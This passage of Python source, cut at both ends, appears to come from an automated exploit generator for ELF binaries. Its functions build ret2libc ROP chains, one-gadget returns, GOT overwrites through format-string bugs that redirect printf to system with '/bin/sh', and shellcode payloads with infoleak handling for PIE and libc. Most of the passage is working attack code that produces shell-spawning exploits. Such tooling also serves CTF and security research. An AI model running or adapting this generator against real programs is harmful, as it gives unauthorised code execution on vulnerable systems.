	write_crash_detection_libc(exploit_name)

	exploits.append(exploit_name)

	# Try ret2OneGadget
	oneShotGadgets = get_oneshot_gadgets(libc_name)

	for gadget in oneShotGadgets:
		exploit_name = setup_libc_exploit(elf, elf_name, libc_name, "Ret2Libc-%d" % i)
		i += 1
		setup_libc_infoleak(infoleak_vuln, libc, exploit_name)

		payload_parts = payload_parts_generator(elf, stack_vuln)

		payload_parts.set_ret([gadget, "libc"])

		payload_parts.construct_payload(elf, exploit_name)

		write_crash_detection_libc(exploit_name)

		exploits.append(exploit_name)

	test_libc_exploits(exploits)

	exit_single_libc_directory()

def Ret2libcPutsInfoleak(args):
	elf_name = args[0]
	elf 	=	args[1]
	libc_name	= args[2]
	libc 	=	args[3]
	stack_vuln 	= args[4]
	pltFuncs 	= args[5]


	enter_single_libc_directory(elf_name, libc_name, "Ret2LibcPutsInfoleak")

	fillerOutput = get_filler_input(elf_name, elf, stack_vuln, pltFuncs, libc_name)

	exploits = []

	i = 0
	exploit_name = setup_libc_exploit(elf, elf_name, libc_name, "Ret2Libc-%d" % i)
	i += 1


	setup_basic_puts_libc_infoleak(elf_name, elf, stack_vuln, pltFuncs, libc, fillerOutput, exploit_name)

	payload_parts = payload_parts_generator(elf, stack_vuln)

	system = get_symbol(libc, "system")
	rop_chain = []
	if elf.arch == "amd64":
		grab_gadgets(libc_name)
		gadget = get_gadget("pop rdi ; ret")		

		binsh = get_bin_sh(libc_name)

		rop_chain.append([gadget, "libc"])
		rop_chain.append([binsh, "libc"])
		rop_chain.append([system, "libc"])

	elif elf.arch == "i386":
		callingFunction = stack_vuln.calling_function
		if (str(callingFunction) == "main"):
			stack_vuln.overwriteable_vars[0] = (stack_vuln.overwriteable_vars[0] - 8)
		payload_parts = payload_parts_generator(elf, stack_vuln)

		binsh = get_bin_sh(libc_name)

		rop_chain.append([system, "libc"])
		rop_chain.append(b"0000")
		rop_chain.append([binsh, "libc"])

	payload_parts.set_rop_chain(rop_chain)
	payload_parts.construct_payload(elf, exploit_name)


	write_crash_detection_libc(exploit_name)

	exploits.append(exploit_name)

	# Try ret2OneGadget
	oneShotGadgets = get_oneshot_gadgets(libc_name)

	if elf.arch == "amd64":
		for gadget in oneShotGadgets:
			i = 0
			exploit_name = setup_libc_exploit(elf, elf_name, libc_name, "Ret2Libc-%d" % i)
			i += 1

			setup_basic_puts_libc_infoleak(elf_name, elf, stack_vuln, pltFuncs, libc, fillerOutput, exploit_name)

			payload_parts = payload_parts_generator(elf, stack_vuln)

			payload_parts.set_ret([gadget, "libc"])

			payload_parts.construct_payload(elf, exploit_name)

			write_crash_detection_libc(exploit_name)

			exploits.append(exploit_name)

	test_libc_exploits(exploits)

	exit_single_libc_directory()

def FsGotWinFunc(args):
	elf_name = args[0]
	elf = args[1]
	fmt_string_vuln = args[2]
	win_funcs = args[3]
	functions_called_after = args[4]

	# Setup the exploit
	exploit_name = setup_exploit(elf_name, elf, "FsGotWinFunc")

	# Grab the needed offsets
	stack_offset, bytes_offset, position_offset = get_fmt_string_offset(fmt_string_vuln, elf_name, elf)

	# The value we are writing
	win_func = win_funcs[0]

	# Where we are writing it to
	got_overwrite_func = functions_called_after[0]
	got_address = get_got(elf, elf_name, got_overwrite_func)

	# Make the format string payload
	if elf.arch == "i386":
		write_fmt_str86(win_func, got_address, stack_offset, bytes_offset, position_offset, exploit_name)

	elif elf.arch == "amd64":
		write_fmt_str64(win_func, got_address, stack_offset, bytes_offset, position_offset, exploit_name)

	fs_exploit_verifictation(exploit_name)

	return [exploit_name]

def FsGotWinFuncPie(args):
	elf_name = args[0]
	elf = args[1]
	fmt_string_vuln = args[2]
	win_funcs = args[3]
	functions_called_after = args[4]
	pie_infoleaks = args[5]

	# Setup the exploit
	exploit_name = setup_exploit(elf_name, elf, "FsGotWinFuncPie")

	# Setup the PIE infoleak
	pieInfoleak = pie_infoleaks[0]
	setup_pie_infoleak(pieInfoleak, exploit_name)

	# Grab the needed offsets
	stack_offset, bytes_offset, position_offset = get_fmt_string_offset_pie(fmt_string_vuln, elf_name, elf)

	# The value we are writing
	win_func = win_funcs[0]

	# Where we are writing it to	
	got_overwrite_func = functions_called_after[0]
	got_address = get_got(elf, elf_name, got_overwrite_func)

	# Make the format string payload
	if elf.arch == "i386":
		write_fmt_str86(win_func, got_address, stack_offset, bytes_offset, position_offset, exploit_name, "pie_base", "pie_base")

	elif elf.arch == "amd64":
		write_fmt_str64(win_func, got_address, stack_offset, bytes_offset, position_offset, exploit_name, "pie_base", "pie_base")

	fs_exploit_verifictation(exploit_name)

	return [exploit_name]

def FsGotWinFuncPieFsleak(args):
	elf_name = args[0]
	elf = args[1]
	fmt_string_vuln = args[2]
	win_funcs = args[3]
	functions_called_after = args[4]

	# Setup the exploit
	exploit_name = setup_exploit(elf_name, elf, "FsGotWinFuncPieFsleak")


	check = setup_fs_pieinfoleak_from_stack(fmt_string_vuln, elf_name, elf, exploit_name)
	if not check:
		return []

	# Grab the needed offsets
	stack_offset, bytes_offset, position_offset = get_fmt_string_offset_pie(fmt_string_vuln, elf_name, elf)

	# The value we are writing
	win_func = win_funcs[0]

	# Where we are writing it to	
	got_overwrite_func = functions_called_after[0]
	address = get_got(elf, elf_name, got_overwrite_func)

	# Make the format string payload
	if elf.arch == "i386":
		write_fmt_str86(win_func, address, stack_offset, bytes_offset, position_offset, exploit_name, "pie_base", "pie_base")

	elif elf.arch == "amd64":
		write_fmt_str64(win_func, address, stack_offset, bytes_offset, position_offset, exploit_name, "pie_base", "pie_base")

	fs_exploit_verifictation(exploit_name)
	return [exploit_name]

def FsGotSystem(args):
	elf_name = args[0]
	elf = args[1]
	fmt_string_vuln = args[2]
	functions_called_after = args[3]

	# Setup the elf_name
	exploit_name = setup_exploit(elf_name, elf, "FsGotSystem")

	# Grab the needed offsets
	stack_offset, bytes_offset, position_offset = get_fmt_string_offset(fmt_string_vuln, elf_name, elf)

	# The addresses we write to for the infinite loop
	got_overwrite_func = functions_called_after[0]
	got_address = get_got(elf, elf_name, got_overwrite_func)

	# The address of main for the infinite loop
	main_address = get_main(elf_name)

	# Get the got address of printf, and the plt address to system
	got_printf_address = get_got(elf, elf_name, "printf")
	plt_system_address = get_plt_system_address(elf_name)

	if elf.arch == "i386":
		write_fmt_str86(main_address, got_address, stack_offset, bytes_offset, position_offset, exploit_name)
		write_fmt_str86(plt_system_address, got_printf_address, stack_offset, bytes_offset, position_offset, exploit_name)
		exploit_write('\ntarget.sendline("/bin/sh\\x00")\n', exploit_name)

	elif elf.arch == "amd64":
		write_fmt_str64(main_address, got_address, stack_offset, bytes_offset, position_offset, exploit_name)
		write_fmt_str64(plt_system_address, got_printf_address, stack_offset, bytes_offset, position_offset, exploit_name)
		exploit_write('\ntarget.sendline("/bin/sh\\x00")\n', exploit_name)

	fs_exploit_verifictation(exploit_name)
	return [exploit_name]

def FsGotSystemPie(args):
	elf_name = args[0]
	elf = args[1]
	fmt_string_vuln = args[2]
	functions_called_after = args[3]
	pie_infoleaks = args[4]

	# Setup the elf_name
	exploit_name = setup_exploit(elf_name, elf, "FsGotSystemPie")

	# Setup the PIE infoleak
	pieInfoleak = pie_infoleaks[0]
	setup_pie_infoleak(pieInfoleak, exploit_name)

	# Grab the needed offsets
	stack_offset, bytes_offset, position_offset = get_fmt_string_offset_pie(fmt_string_vuln, elf_name, elf)

	# The got address we overwrite to create the loop
	got_overwrite_func = functions_called_after[0]
	got_address = get_got(elf, elf_name, got_overwrite_func)

	# The address of main which we will write to the earlier got address
	main_address = get_main(elf_name)

	# The got address of printf, which we will overwrite with system
	got_printf_address = get_got(elf, elf_name, "printf")

	# Get the plt address of system
	plt_system_address = get_plt_system_address(elf_name)

	if elf.arch == "i386":
		write_fmt_str86(main_address, got_address, stack_offset, bytes_offset, position_offset, exploit_name, "pie_base", "pie_base")
		write_fmt_str86(plt_system_address, got_printf_address, stack_offset, bytes_offset, position_offset, exploit_name, "pie_base", "pie_base")
		exploit_write('\ntarget.sendline("/bin/sh\\x00")\n', exploit_name)

	elif elf.arch == "amd64":
		write_fmt_str64(main_address, got_address, stack_offset, bytes_offset, position_offset, exploit_name, "pie_base", "pie_base")
		write_fmt_str64(plt_system_address, got_printf_address, stack_offset, bytes_offset, position_offset, exploit_name, "pie_base", "pie_base")
		exploit_write('\ntarget.sendline("/bin/sh\\x00")\n', exploit_name)

	fs_exploit_verifictation(exploit_name)
	return [exploit_name]

def FsRetWinFunc(args):
	elf_name = args[0]
	elf = args[1]
	fmt_string_vuln = args[2]
	win_funcs = args[3]
	stack_infoleaks = args[4]

	# Setup the exploit
	exploit_name = setup_exploit(elf_name, elf, "FsRetWinFunc")

	# Setup the Stack infoleak
	stack_infoleak = stack_infoleaks[0]
	setup_stack_fs_infoleak(stack_infoleak, exploit_name)

	# Grab the needed offsets
	stack_offset, bytes_offset, position_offset = get_fmt_string_offset(fmt_string_vuln, elf_name, elf)

	# The value we are writing
	win_func = win_funcs[0]

	# Make the format string payload
	if elf.arch == "i386":
		write_fmt_str86(win_func, 0, stack_offset, bytes_offset, position_offset, exploit_name, None, "ret_address")

	elif elf.arch == "amd64":
		write_fmt_str64(win_func, 0, stack_offset, bytes_offset, position_offset, exploit_name, None, "ret_address")

	fs_exploit_verifictation(exploit_name)
	return [exploit_name]

def FsRetShellcode(args):
	elf_name = args[0]
	elf = args[1]
	fmt_string_vuln = args[2]
	stack_infoleaks = args[3]
	piePresent = args[4]

	# Setup the exploit
	exploit_name = setup_exploit(elf_name, elf, "FsRetShellcode")

	# Setup the Stack infoleak
	stack_infoleak = stack_infoleaks[0]
	setup_stack_fs_infoleak(stack_infoleak, exploit_name)

	# Grab the needed offsets
	if piePresent == True:
		stack_offset, bytes_offset, position_offset = get_fmt_string_offset_pie(fmt_string_vuln, elf_name, elf)
	else:
		stack_offset, bytes_offset, position_offset = get_fmt_string_offset(fmt_string_vuln, elf_name, elf)		

	inp = fmt_string_vuln.inp_method

	# Get the shellcode we will use
	shellcode, shellcode_len = get_shellcode(elf, inp)

	if elf.arch == "i386":
		if inp.write_size < shellcode_len + 38:
			return []
		if inp.offset >= (shellcode_len + 38):
			shellcode_offset = inp.offset - 38
		else:
			shellcode_offset = -4

	elif elf.arch == "amd64":
		if inp.write_size < shellcode_len + 88:
			return []
		if inp.offset >= (shellcode_len + 88):
			shellcode_offset = inp.offset - 88
		else:
			shellcode_offset = -8

	if elf.arch == "i386":
		write_fmt_str_shellcode32(shellcode_offset, 0x00, stack_offset, bytes_offset, position_offset, shellcode, inp.offset, exploit_name, "ret_address", "ret_address")

	elif elf.arch == "amd64":
		write_fmt_str_shellcode64(shellcode_offset, 0x00, stack_offset, bytes_offset, position_offset, shellcode, inp.offset, exploit_name, "ret_address", "ret_address")

	fs_exploit_verifictation(exploit_name)
	return [exploit_name]

def FsGotShellcode(args):
	elf_name = args[0]
	elf = args[1]
	fmt_string_vuln = args[2]
	functions_called_after = args[3]
	stack_infoleaks = args[4]

	# Setup the exploit
	exploit_name = setup_exploit(elf_name, elf, "FsGotShellcode")

	# Setup the Stack infoleak
	stack_infoleak = stack_infoleaks[0]
	setup_stack_fs_infoleak(stack_infoleak, exploit_name)

	stack_offset, bytes_offset, position_offset = get_fmt_string_offset(fmt_string_vuln, elf_name, elf)		


	# The got address we overwrite to create the loop
	got_overwrite_func = functions_called_after[0]
	got_address = get_got(elf, elf_name, got_overwrite_func)

	inp = fmt_string_vuln.inp_method

	# Get the shellcode we will use
	shellcode, shellcode_len = get_shellcode(elf, inp)

	if elf.arch == "i386":
		if inp.write_size < shellcode_len + 38:
			return []
		else:
			shellcode_offset = inp.offset - 38


	elif elf.arch == "amd64":
		if inp.write_size < shellcode_len + 88:
			return []
		else:
			shellcode_offset = inp.offset - 88

	# Make the format string payload
	if elf.arch == "i386":
		write_fmt_str_shellcode32(shellcode_offset, got_address, stack_offset, bytes_offset, position_offset, shellcode, inp.offset, exploit_name, "ret_address")

	elif elf.arch == "amd64":
		write_fmt_str_shellcode64(shellcode_offset, got_address, stack_offset, bytes_offset, position_offset, shellcode, inp.offset, exploit_name, "ret_address")

	fs_exploit_verifictation(exploit_name)
	return [exploit_name]

def FsGotShellcodeFsleak(args):
	elf_name = args[0]
	elf = args[1]
	fmt_string_vuln = args[2]
	functions_called_after = args[3]

	# Setup the exploit
	exploit_name = setup_exploit(elf_name, elf, "FsGotShellcodeFsleak")

	stack_offset, bytes_offset, position_offset = get_fmt_string_offset(fmt_string_vuln, elf_name, elf)		

	# The got address we overwrite to create the loop
	got_overwrite_func = functions_called_after[0]
	got_address = get_got(elf, elf_name, got_overwrite_func)

	shellcode, shellcode_len = get_shellcode(elf, fmt_string_vuln.inp_method)

	main_address = get_main(elf_name)

	# Make the format string payload
	if elf.arch == "i386":
		write_fmt_str86(main_address, got_address, stack_offset, bytes_offset, position_offset, exploit_name)
		setup_fs_stack_infoleak_from_stack(fmt_string_vuln, elf_name, elf, shellcode, shellcode_len, exploit_name)
		write_fmt_str86(0x00, got_address, stack_offset, bytes_offset, position_offset, exploit_name, "input_address")

	elif elf.arch == "amd64":
		write_fmt_str64(main_address, got_address, stack_offset, bytes_offset, position_offset, exploit_name)
		setup_fs_stack_infoleak_from_stack(fmt_string_vuln, elf_name, elf, shellcode, shellcode_len, exploit_name)
		write_fmt_str64(0x00, got_address, stack_offset, bytes_offset, position_offset, exploit_name, "input_address")

	fs_exploit_verifictation(exploit_name)

	return [exploit_name]

def FsGotLibc(args):
	elf_name = args[0]
	elf = args[1]
	fmt_string_vuln = args[2]
	functions_called_after = args[3]
	libc_infoleaks = args[4]
	libc_name = args[5]
	libc = args[6]

	enter_single_libc_directory(elf_name, libc_name, "FsGotLibc")

	# Setup the exploit
	exploit_name = setup_libc_exploit(elf, elf_name, libc_name, "FsGotLibc")


	# Setup the libc infoleak
	libcInfoleak = libc_infoleaks[0]
	setup_libc_infoleak(libcInfoleak, libc, exploit_name)

	# Grab the needed offsets
	stack_offset, bytes_offset, position_offset = get_fmt_string_offset(fmt_string_vuln, elf_name, elf)

	# The address we write to for the infinite loop
	got_overwrite_func = functions_called_after[0]
	got_address = get_got(elf, elf_name, got_overwrite_func)

	# The value we write for the infinite loop
	main_address = get_main(elf_name)

	# The address of main we will write to, to get a shell	
	got_print_address = get_got(elf, elf_name, "printf")

	# Libc address of either system / one gadget
	libc_address = get_symbol(libc, "system")

	if elf.arch == "i386":
		write_fmt_str86(main_address, got_address, stack_offset, bytes_offset, position_offset, exploit_name)
		write_fmt_str86(libc_address, got_print_address, stack_offset, bytes_offset, position_offset, exploit_name, "libc_base")
		exploit_write('\ntarget.sendline("/bin/sh\\x00")\n', exploit_name)

	elif elf.arch == "amd64":
		write_fmt_str64(main_address, got_address, stack_offset, bytes_offset, position_offset, exploit_name)
		write_fmt_str64(libc_address, got_print_address, stack_offset, bytes_offset, position_offset, exploit_name, "libc_base")
		exploit_write('\ntarget.sendline("/bin/sh\\x00")\n', exploit_name)

	fs_exploit_verifictation(exploit_name)
	test_libc_exploits([exploit_name])
	exit_single_libc_directory()

def FsGotLibcFsleakLoop(args):
	elf_name = args[0]
	elf = args[1]
	fmt_string_vuln = args[2]
	libc_name = args[3]
	libc = args[4]

	enter_single_libc_directory(elf_name, libc_name, "FsGotLibcFsleakLoop")

	# Setup the exploit
	exploit_name = setup_libc_exploit(elf, elf_name, libc_name, "FsGotLibcFsleakLoop")

	# Grab the needed offsets
	stack_offset, bytes_offset, position_offset = get_fmt_string_offset(fmt_string_vuln, elf_name, elf)

	# The address of main we will write to, to get a shell	
	got_print_address = get_got(elf, elf_name, "printf")

	# Libc address of either system / one gadget
	libc_address = get_symbol(libc, "system")

	check = setup_fs_libc_infoleak_from_stack(fmt_string_vuln, elf_name, elf, exploit_name)
	if not check:
		exit_single_libc_directory()
		return []

	if elf.arch == "i386":		
		write_fmt_str86(libc_address, got_print_address, stack_offset, bytes_offset, position_offset, exploit_name, "libc_base")
		exploit_write('\ntarget.sendline("/bin/sh\\x00")\n', exploit_name)

	elif elf.arch == "amd64":	
		write_fmt_str64(libc_address, got_print_address, stack_offset, bytes_offset, position_offset, exploit_name, "libc_base")
		exploit_write('\ntarget.sendline("/bin/sh\\x00")\n', exploit_name)

	fs_exploit_verifictation(exploit_name)
	test_libc_exploits([exploit_name])

	exit_single_libc_directory()

def FsGotOneshot(args):
	elf_name = args[0]
	elf = args[1]
	fmt_string_vuln = args[2]
	functions_called_after = args[3]
	libc_infoleaks = args[4]
	libc_name = args[5]
	libc = args[6]


	if elf.arch != "amd64":
		return []

	enter_single_libc_directory(elf_name, libc_name, "FsGotOneshot")

	i = 0

	exploits = []

	# Setup the elf_name
	exploit_name = setup_exploit(elf_name, elf, "FsGotOneshot")

	# Grab the needed offsets
	stack_offset, bytes_offset, position_offset = get_fmt_string_offset(fmt_string_vuln, elf_name, elf)

	# The addresses we write to for the infinite loop
	got_overwrite_func = functions_called_after[0]
	got_address = get_got(elf, elf_name, got_overwrite_func)

	libcInfoleak = libc_infoleaks[0]


	one_shot_gadgets = get_oneshot_gadgets(libc_name)
	for one_shot in one_shot_gadgets:
		exploit_name = setup_libc_exploit(elf, elf_name, libc_name, "FsGotOneshot-%d" % i)
		i += 1
		setup_libc_infoleak(libcInfoleak, libc, exploit_name)
		write_fmt_str64(one_shot, got_address, stack_offset, bytes_offset, position_offset, exploit_name, "libc_base")
		fs_exploit_verifictation(exploit_name)
		exploits.append(exploit_name)

	test_libc_exploits(exploits)
	exit_single_libc_directory()
'''
+-----------------------------------------------------------+
|        Attack Exploitation Generation Correction          |
+-----------------------------------------------------------+
'''

def CorrectBofVar(args):
	elf_name = args[0]
	elf = args[1]
	stack_vuln = args[2]

	inpType = stack_vuln.inp_type
	
	payload_permutations = get_payload_permutations(stack_vuln, elf.arch)

	exploits = []

	payload_parts = PayloadParts()
	payload_parts.start = stack_vuln.overwriteable_vars[0]

	payload_parts.ret_address = None

	j = 0
	for i in range(0, len(payload_permutations)):
		payload_parts.parts = payload_permutations[i]
		if inpType == "stdin":
			exploit_name = multi_setup_exploit(elf_name, elf, "BofVar-%d" % j)
			j += 1

			payload_parts.construct_payload(elf, exploit_name)
			write_crash_detection(exploit_name)

			exploits.append(exploit_name)
		else:
			exploit_name = payload_parts.construct_payload_argv(elf, elf_name, "BofVar", i)
			verify_argv_exploit(exploit_name)
	return exploits

def CorrectBofFunc(args):
	elf_name = args[0]
	elf = args[1]
	stack_vuln = args[2]
	functions = args[3]

	payload_permutations = get_payload_permutations(stack_vuln, elf.arch)

	exploits = []
	ptrSize = get_arch_int_size(elf)
	payload_parts = PayloadParts()

	k = 0

	payload_parts.start = stack_vuln.overwriteable_vars[0]
	for i in range(0, len(payload_permutations)):
		for j in range(0, len(functions)):
			exploit_name = multi_setup_exploit(elf_name, elf, "BofFunc-%d" % k)
			k += 1

			payload_parts.parts = payload_permutations[i]
			payload_parts.set_ret(functions[j])

			payload_parts.construct_payload(elf, exploit_name)

			write_crash_detection(exploit_name)
			exploits.append(exploit_name)

	return exploits

def CorrectBofFuncWInfoleak(args):
	elf_name = args[0]
	elf = args[1]
	stack_vuln = args[2]
	functions = args[3]
	infoleak_vulns = args[4]

	payload_permutations = get_payload_permutations(stack_vuln, elf.arch)

	exploits = []
	ptrSize = get_arch_int_size(elf)

	payload_parts = PayloadParts()
	payload_parts.start = stack_vuln.overwriteable_vars[0]

	k = 0

	for i in range(0, len(payload_permutations)):
		for j in range(0, len(functions)):
			exploit_name = multi_setup_exploit(elf_name, elf, "BofFuncWInfoleak-%d" % k)
			k += 1

			infoleak_vuln = infoleak_vulns[0]
			setup_pie_infoleak(infoleak_vuln, exploit_name)

			payload_parts.parts = payload_permutations[i]
			payload_parts.set_ret([functions[j], "pie"])

			payload_parts.construct_payload(elf, exploit_name)

			write_crash_detection(exploit_name)
			exploits.append(exploit_name)

	return exploits

def CorrectBofSystem(args):
	elf_name = args[0]
	elf = args[1]
	stack_vuln = args[2]
	arch = elf.arch

	system = get_symbol(elf, "system")
	binsh  = get_bin_sh(elf_name)

	payload_permutations = get_payload_permutations(stack_vuln, elf.arch)

	exploits = []

	if arch == "amd64":
		grab_gadgets(elf_name)
		gadget = get_gadget("pop rdi ; ret")		

	payload_parts = PayloadParts()
	payload_parts.start = stack_vuln.overwriteable_vars[0]

	rop_chain = []
	if arch == "amd64":
		grab_gadgets(elf_name)
		gadget = get_gadget("pop rdi ; ret")

		rop_chain.append(gadget)
		rop_chain.append(binsh)
		rop_chain.append(system)

	elif arch == "i386":
		rop_chain.append(system)
		rop_chain.append(b"0000")
		rop_chain.append(binsh)		

	payload_parts.set_rop_chain(rop_chain)

	j = 0
	for i in range(0, len(payload_permutations)):
		exploit_name = multi_setup_exploit(elf_name, elf, "BofSystem-%d" % j)
		j += 1
		payload_parts.parts = payload_permutations[i]

		payload_parts.construct_payload(elf, exploit_name)
		write_crash_detection(exploit_name)

		exploits.append(exploit_name)

	return exploits


def CorrectBofSystemWInfoleak(args):
	elf_name = args[0]
	elf = args[1]
	stack_vuln = args[2]
	infoleak_vulns = args[3]
	arch = elf.arch

	system = get_plt_system_address(elf_name)

	binsh  = get_bin_sh(elf_name)

	payload_permutations = get_payload_permutations(stack_vuln, elf.arch)

	exploits = []

	payload_parts = PayloadParts()
	payload_parts.start = stack_vuln.overwriteable_vars[0]

	rop_chain = []
	if arch == "amd64":
		grab_gadgets(elf_name)
		gadget = get_gadget("pop rdi ; ret")

		rop_chain.append([gadget, "pie"])
		rop_chain.append([binsh, "pie"])
		rop_chain.append([system, "pie"])

	elif arch == "i386":
		rop_chain.append([system, "pie"])
		rop_chain.append(b"0000")
		rop_chain.append([binsh, "pie"])	

	j = 0
	payload_parts.set_rop_chain(rop_chain)
	for i in range(0, len(payload_permutations)):
		payload_parts.parts = payload_permutations[i]

		exploit_name = multi_setup_exploit(elf_name, elf, "BofSystemWInfoleak-%d" % j)
		j += 1
		
		infoleak_vuln = infoleak_vulns[0]
		setup_pie_infoleak(infoleak_vuln, exploit_name)

		payload_parts.construct_payload(elf, exploit_name)
		write_crash_detection(exploit_name)

		exploits.append(exploit_name)

	return exploits

def CorrectBofFuncArgv(args):
	elf_name = args[0]
	elf = args[1]
	stack_vuln = args[2]
	functions = args[3]

	payload_permutations = get_payload_permutations(stack_vuln, elf.arch)

	exploits = []
	ptrSize = get_arch_int_size(elf)
	payload_parts = PayloadParts()
	payload_parts.start = stack_vuln.overwriteable_vars[0]
	k = 0
	for i in range(0, len(payload_permutations)):
		for j in range(0, len(functions)):
			payload_parts.parts = payload_permutations[i]
			payload_parts.set_ret(functions[j])		
			exploit_name = payload_parts.construct_payload_argv(elf, elf_name, "BofFuncArgv", i + j)
			verify_argv_exploit(exploit_name)
			k += 1
	return []

def CorrectBofShellcode(args):
	# Get out args
	elf_name = args[0]
	elf = args[1]
	stack_vuln = args[2]
	infoleak_vuln = args[3]

	# Get the ptr size, and he elf_name
	ptrSize = get_arch_int_size(elf)

	# Setup exploits list
	exploits = []

	# Get the shellcode we will use
	shellcodes = get_all_shellcode(elf, stack_vuln)

	i = 0
	for shellcode_list in shellcodes:

		shellcode = shellcode_list[0]
		shellcode_len = shellcode_list[1]

		exploit_name = multi_setup_exploit(elf_name, elf, "BofShellcode-%d" % i)
		i += 1

		setup_stack_shellcode_infoleak(infoleak_vuln, exploit_name)

		payload_parts = placeShellcode(elf, stack_vuln, shellcode, shellcode_len)

		payload_parts.construct_payload(elf, exploit_name)

		write_crash_detection(exploit_name)

		exploits.append(exploit_name)

	return exploits

def CorrectIndrCall(args):
	elf_name = args[0]
	elf = args[1]
	stack_vuln = args[2]
	win_funcs = args[3]

	original_stack_vuln = stack_vuln
	
	exploits = []

	indirect_ptrs = get_writeable_indirect_ptrs(stack_vuln) 

	payload_parts = PayloadParts()
	payload_parts.start = stack_vuln.overwriteable_vars[0]
	payload_parts.retAddress = None

	k = 0
	for i in range(0, len(indirect_ptrs)):

		ptr = indirect_ptrs[i]

		for win_func in win_funcs:
			working_stack_vuln = prep_indirect_call(elf, original_stack_vuln, win_func, ptr)

			payload_permutations = get_payload_permutations(working_stack_vuln, elf.arch)

			for j in range(0, len(payload_permutations)):
				payload_parts.parts = payload_permutations[j]

				exploit_name = multi_setup_exploit(elf_name, elf, "IndrCall-%d" % k)
				k += 1

				payload_parts.construct_payload(elf, exploit_name)
				write_crash_detection(exploit_name)

				exploits.append(exploit_name)

	return exploits

def CorrectIndrCallPie(args):
	elf_name = args[0]
	elf = args[1]
	stack_vuln = args[2]
	win_funcs = args[3]
	pieInfoleaks = args[4]
	
	infoleak_vuln = pieInfoleaks[0]

	original_stack_vuln = stack_vuln

	exploits = []

	indirect_ptrs = get_writeable_indirect_ptrs(stack_vuln) 

	k = 0
	for i in range(0, len(indirect_ptrs)):

		ptr = indirect_ptrs[i]
		for win_func in win_funcs:
			working_stack_vuln = prep_indirect_call(elf, original_stack_vuln, win_func, ptr, "pie")

			payload_permutations = get_payload_permutations(working_stack_vuln, elf.arch)

			for j in range(0, len(payload_permutations)):
				exploit_name = multi_setup_exploit(elf_name, elf, "IndrCallPie-%d" % k)
				k += 1
			
				setup_pie_infoleak(infoleak_vuln, exploit_name)
				payload_parts = payload_parts_generator(elf, working_stack_vuln, False)

				payload_parts.construct_payload(elf, exploit_name)
				write_crash_detection(exploit_name)

				exploits.append(exploit_name)


	return exploits


def CorrectIndrCallShellcode(args):
	elf_name = args[0]
	elf = args[1]
	stack_vuln = args[2]
	stack_infoleaks = args[3]

	# Setup the stack infoleak
	infoleak_vuln = stack_infoleaks[0]

	original_stack_vuln = stack_vuln

	exploits = []

	# Get the indirect ptrs we will be using
	indirect_ptrs = get_writeable_indirect_ptrs(stack_vuln) 
	i = 0
	for ptr in indirect_ptrs:
		# Prep the indirect call
		working_stack_vuln = prep_indirect_call(elf, original_stack_vuln, 0, ptr, "stack")

		shellcodes = get_all_shellcode(elf, working_stack_vuln)

		# Iterate through all of the shellcodes for the arch
		for shellcode_list in shellcodes:
			exploit_name = multi_setup_exploit(elf_name, elf, "IndrCallShellcode-%d" % i)
			i += 1
			setup_stack_shellcode_infoleak(infoleak_vuln, exploit_name)

			shellcode = shellcode_list[0]
			shellcode_len = shellcode_list[1]

			# Get the shellcode we will use
			shellcode, shellcode_len = get_shellcode(elf, working_stack_vuln)

			# Setup the payload, and place the shellcode
			payload_parts = place_shellcode_indr_call(elf, working_stack_vuln, shellcode, shellcode_len)

			if payload_parts != None:
				payload_parts.construct_payload(elf, exploit_name)
				write_crash_detection(exploit_name)

				exploits.append(exploit_name)

	return exploits


def CorrectBofStatic(args):
	return BofStatic(args)

def CorrectCallInput(args):
	elf_name = args[0]
	elf = args[1]
	call_input_vuln = args[2]

	# Fill up our input with nops, up to where we know our input gets executed
	offset = call_input_vuln.offset

	payload_parts = PayloadParts()
	payload_parts.start = offset

	exploits = []

	shellcodes = get_all_shellcode(elf, call_input_vuln)

	i = 0
	for shellcode_list in shellcodes:

		shellcode = shellcode_list[0]
		exploit_name = multi_setup_exploit(elf_name, elf, "CallInput-%d" % i)
		i += 1

		parts = []
		shellcode_part = Part()
		shellcode_part.type = bytes
		shellcode_part.region = None
		shellcode_part.offset = 0
		shellcode_part.value = shellcode
		parts.append(shellcode_part)
		payload_parts.parts = parts
		payload_parts.set_default_byte(0x90)
		
		# Generate the exploit
		payload_parts.construct_payload(elf, exploit_name)

		write_crash_detection(exploit_name)

		exploits.append(exploit_name)

	return exploits

def CorrectFsGotWinFunc(args):
	elf_name = args[0]
	elf = args[1]
	fmt_string_vuln = args[2]
	win_funcs = args[3]
	functions_called_after = args[4]

	# Setup the exploits
	exploits = []

	# Grab the needed offsets
	stack_offset, bytes_offset, position_offset = get_fmt_string_offset(fmt_string_vuln, elf_name, elf)

	# Where we are writing it to
	got_overwrite_func = functions_called_after[0]
	got_address = get_got(elf, elf_name, got_overwrite_func)

	i = 0
	for win_func in win_funcs:
		if elf.arch == "i386":
			exploit_name = multi_setup_exploit(elf_name, elf, "FsGotWinFunc-%d" % i)
			write_fmt_str86(win_func, got_address, stack_offset, bytes_offset, position_offset, exploit_name)

		elif elf.arch == "amd64":
			exploit_name = multi_setup_exploit(elf_name, elf, "FsGotWinFunc-%d" % i)
			write_fmt_str64(win_func, got_address, stack_offset, bytes_offset, position_offset, exploit_name)
		i += 1
		fs_exploit_verifictation(exploit_name)
		exploits.append(exploit_name)

	return exploits

def CorrectFsGotWinFuncPie(args):
	elf_name = args[0]
	elf = args[1]
	fmt_string_vuln = args[2]
	win_funcs = args[3]
	functions_called_after = args[4]
	pieInfoleaks = args[5]

	# Setup the exploits
	exploits = []

	pieInfoleak = pieInfoleaks[0]

	# Grab the needed offsets
	stack_offset, bytes_offset, position_offset = get_fmt_string_offset_pie(fmt_string_vuln, elf_name, elf)

	# Where we are writing it to
	got_overwrite_func = functions_called_after[0]
	got_address = get_got(elf, elf_name, got_overwrite_func)

	i = 0
	for win_func in win_funcs:
		exploit_name = multi_setup_exploit(elf_name, elf, "FsGotWinFuncPie-%d" % i)
		i += 1
		if elf.arch == "i386":
			setup_pie_infoleak(pieInfoleak, exploit_name)
			write_fmt_str86(win_func, got_address, stack_offset, bytes_offset, position_offset, exploit_name, "pie_base", "pie_base")

		elif elf.arch == "amd64":
			setup_pie_infoleak(pieInfoleak, exploit_name)
			write_fmt_str64(win_func, got_address, stack_offset, bytes_offset, position_offset, exploit_name, "pie_base", "pie_base")

		fs_exploit_verifictation(exploit_name)
		exploits.append(exploit_name)
	return exploits

def CorrectFsGotWinFuncPieFsleak(args):
	elf_name = args[0]
	elf = args[1]
	fmt_string_vuln = args[2]
	win_funcs = args[3]
	functions_called_after = args[4]

	# Setup the exploits
	exploits = []

